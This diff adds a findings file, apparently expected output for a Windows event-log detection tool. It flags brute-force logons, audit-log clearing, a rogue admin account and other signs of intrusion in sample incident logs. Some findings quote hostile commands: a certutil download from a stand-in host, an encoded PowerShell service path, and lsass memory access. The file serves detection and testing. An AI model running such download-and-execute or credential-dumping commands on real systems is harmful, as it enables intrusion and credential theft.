@@ -1,0 +1,15 @@
+# 3 files, 14 findings
+critical	EVT004	logs/incident.jsonl:13	administrator logged on from 198.51.100.77 on WS-FIN-07 after 12 failed logons
+critical	EVT001	logs/incident.jsonl:22	the Security audit log was cleared on WS-FIN-07 by administrator
+high	EVT003	logs/incident.jsonl:1	12 failed logons from 198.51.100.77
+high	EVT002	logs/incident.jsonl:13	RDP logon of administrator from public address 198.51.100.77 on WS-FIN-07
+high	EVT005	logs/incident.jsonl:14	service updsvc installed on WS-FIN-07 with suspicious image path cmd.exe /c powershell -enc SQBFAFgA
+high	EVT007	logs/incident.jsonl:15	CN=svc_update was added to Administrators on WS-FIN-07
+high	EVT012	logs/incident.jsonl:18	suspicious command line on WS-FIN-07: certutil.exe -urlcache -f http://x.example/p.bin p.bin
+high	EVT013	logs/incident.jsonl:19	C:\Temp\x.exe opened lsass.exe with access 0x1010 on WS-FIN-07
+high	EVT011	logs/incident.jsonl:20	PowerShell script block on WS-FIN-07 contains "iex ("
+medium	EVT006	logs/flat-array.json:2	service Backup Agent installed on SRV-APP-01 (C:\Program Files\Backup\agent.exe)
+medium	EVT008	logs/incident.jsonl:16	user account svc_update created on WS-FIN-07 by administrator
+medium	EVT010	logs/incident.jsonl:17	scheduled task \Updater created on WS-FIN-07 by administrator
+medium	EVT009	logs/incident.jsonl:21	the audit policy was changed on WS-FIN-07 by administrator
+info	EVT000	logs/empty.json	no events found, ignored
